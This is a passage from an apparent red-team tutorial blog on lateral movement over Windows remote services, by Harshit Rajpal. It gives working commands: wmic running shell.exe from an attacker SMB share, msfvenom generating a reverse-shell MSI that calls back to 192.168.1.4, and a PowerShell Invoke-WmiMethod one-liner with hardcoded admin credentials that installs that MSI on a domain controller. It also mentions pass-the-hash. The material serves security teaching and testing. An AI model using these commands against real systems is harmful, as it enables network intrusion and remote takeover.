+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI9OIyMhkokK_6qEAfdYzfodRcH57ZcNx4VQOGNEV237T6ic2EUXLxjvGAslilj3PdULWEVzhkZMQ-JTwu5OrrUAQ57fXtzSDCKTj_gLnVxd-wjJ0siNIhxDGqrSU6vCnSlqqm-OeuXhY4NwhR8UN0Qk-mDVEQJ1KqALxL2jcGQgs_luhkf4vH7G2N2Q/s16000/57.png"/></span></p>
+<p><span style="color: #000000;">i.e., these hashes can further be used with psexec to conduct pass the hash attacks!</span></p>
+<h3><span style="color: #800000;">Lateral Movement through WMI</span></h3>
+<p><span style="color: #000000;">The <strong data-start="590" data-end="617">WMI command-line (WMIC)</strong> utility provides a <strong data-start="637" data-end="663">command-line interface</strong> for <strong data-start="668" data-end="712">Windows Management Instrumentation (WMI)</strong>. WMIC integrates seamlessly with existing shells and utility commands. Additionally, you can use <strong data-start="814" data-end="821">WMI</strong> to execute commands remotely by using the <strong data-start="864" data-end="873">/node</strong> flag. For instance, in the following example, we create a new process that executes our shell hosted on an <strong data-start="981" data-end="995">SMB server</strong> located at node 192.168.1.2.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wmic /node:192.168.1.2 /user:administrator process call create "cmd.exe /c \\192.168.1.4\sharename\shell.exe"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_4qbiG4PXOs2Chp1oxx7Rh0SDwUG0NkicULLX5wqaiuBUX4SMDy0WiL-leR3f37X-37Uur75mjcJxtRivpYDXI8py0IdljcFLaZ9Yk4xXYfqBS7xMYRtkyIuuZJj-op1-vJuaQRMMcXhExKitul7HSpE5KZMWYX_2_xSKRHgmZxt01ruKdANenVzPuA/s16000/58.png"/></span></p>
+<p><span style="color: #000000;">As you can see, execution was successful and we have received a reverse shell</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj30l8N60xGqiUq67kO2atLX1AzEZ6RXCFKGJ0RWhXhYjU5O_J0qUIahkrfkwXBvRpbMStcpxEMFcamsyfmm2DxJp0X4bV5pZUbZW2Qq7abAGIMDyBlghjjCbsS21PcuMC4HAtuCpYRkG1g6CnifvvfvftXYd7WiP8EOBKmfN89jqRSuj8fpbtg7013Lw/s16000/59.png"/></strong></span></p>
+<h3><span style="color: #800000;">Lateral Movement through Invoke-WmiMethod</span></h3>
+<p><span style="color: #000000;">As for any good utility that existed as a binary in windows, Microsoft has created an equivalent powershell cmdlet for it. Invoke-WmiMethod is a cmdlet that does the same as wmic in the example above. Newer Invoke-CimMethod in PS 5.1+ does the same thing. Refer <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/invoke-cimmethod?view=powershell-5.1">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;">To use Invoke-WmiMethod using CLI, we need to craft a command. Thanks to <a style="color: #000000;" href="https://www.ired.team/offensive-security/lateral-movement/t1175-distributed-component-object-model"><span style="color: #0000ff;"><strong>@spotheplanet</strong></span></a> for this technique. We can use generic Invoke-WmiMethod too but it requires GUI which we generally don’t have in Red Team scenarios.</span></p>
+<p><span style="color: #000000;">In this technique, we will create a malicious MSI file, and install it in the destination server.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.4 LPORT=1337 -f msi &gt; shell.msi</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiVYMOoSCZU7uh9qT7zS6cgZXl3py22eol14UGpsPcyLbCZZN-B_O3kcnWQMxL7BOfqBjkOCalEVYltyWaYhsXePRt9bIJtKe2CYXWKDVJzqHepok0l_qeTI5CfbTKWAmC0vCl-KkIJvlqfnShizD63-_d5XbjcxT9rzWlX60yTwMDkxC0tMtN_OVG0VA/s16000/60.png"/></span></p>
+<p><span style="color: #000000;">Now, in the CLI of the compromised victim, we put in the following command. This command basically provides credentials (Administrator:Ignite@987) to Invoke-WmiMethod and installs an MSI file put in our SMB share.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$username = 'Administrator';$password = 'Ignite@987';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","\\192.168.1.4\sharename\shell.msi") -ComputerName dc1 -Credential $credential</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiOdFlLHMFQ_2ueT5Gel4vFF4eMVdOHpi8ny_UTapDcKSXlaUlB4CkMDmrTFfvvBZrQguOiOKzHwD3AfISjw7h-PbOJSPUnZwNWsSzxgyL44OJ6q-YHiKfQlQ6nHtKonr7bn8h0nRPyTNvO9kr_y1mfBbQ6BUNKqQ6x7jOam2UP9X0DioZZR4N7BzU2LQ/s16000/61.png"/></strong></span></p>
+<p><span style="color: #000000;">On our reverse listener, you can see a stable shell has now popped up!</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDgtugo9MM4wxLMCy0cbYdMV6MPR6Qe4JcCWPNaBt1WJ0bQeNFnfeNNIQKmHJuH6I7u-HzIcfmO7ndqeDosaNhCbic6EFUZOL_7NCzUrkHNkITfDq9BJ86JHdMHW_Wr9p5FSaB09dNG89WwxI0Ec8-rzr-hHzLbs1s6UPwGsLOKrvaa4mv_0y2-LhzrQ/s16000/62.png"/><br/>
+</strong></span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;"><strong data-start="160" data-end="180">Lateral Movement</strong> is an essential step in <strong data-start="205" data-end="220">red teaming</strong> because it leads to <strong data-start="241" data-end="265">privilege escalation</strong> and network compromise. In this article, we discussed how <strong data-start="324" data-end="343">Remote Services</strong> can facilitate <strong data-start="359" data-end="379">lateral movement</strong> during <strong data-start="387" data-end="411">Red Team Assessments</strong>. These services inherently allow interaction with remote systems. We demonstrated various techniques throughout the article, showcasing how attackers can exploit them.</span></p>
+<h3><span style="color: #000000;"><strong> </strong></span><span style="color: #800000;">References</span></h3>
+<ul>
+<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://attack.mitre.org/techniques/T1021/">https://attack.mitre.org/techniques/T1021/</a></strong></span></li>
+<li><span style="color: #0000ff;"><strong>https://github.com/redcanaryco/atomic-red-team</strong></span></li>
+<li><span style="color: #0000ff;"><strong>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0?redirectedfrom=MSDN</strong></span></li>
+<li><span style="color: #0000ff;"><strong>https://docs.microsoft.com/en-gb/windows/win32/com/the-component-object-model?redirectedfrom=MSDN</strong></span></li>
+<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/">https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/</a></strong></span></li>
+<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.ired.team/offensive-security/lateral-movement/t1028-winrm-for-lateral-movement">https://www.ired.team/offensive-security/lateral-movement/t1028-winrm-for-lateral-movement</a></strong></span></li>
+<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.thomasmaurer.ch/2020/04/enable-powershell-ssh-remoting-in-powershell-7/">https://www.thomasmaurer.ch/2020/04/enable-powershell-ssh-remoting-in-powershell-7/</a></strong></span></li>
+<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-gb/windows/win32/winrm/installation-and-configuration-for-windows-remote-management?redirectedfrom=MSDN">https://docs.microsoft.com/en-gb/windows/win32/winrm/installation-and-configuration-for-windows-remote-management?redirectedfrom=MSDN</a></strong></span></li>
+<li><span style="color: #0000ff;"><strong>https://blog.gentilkiwi.com/mimikatz</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
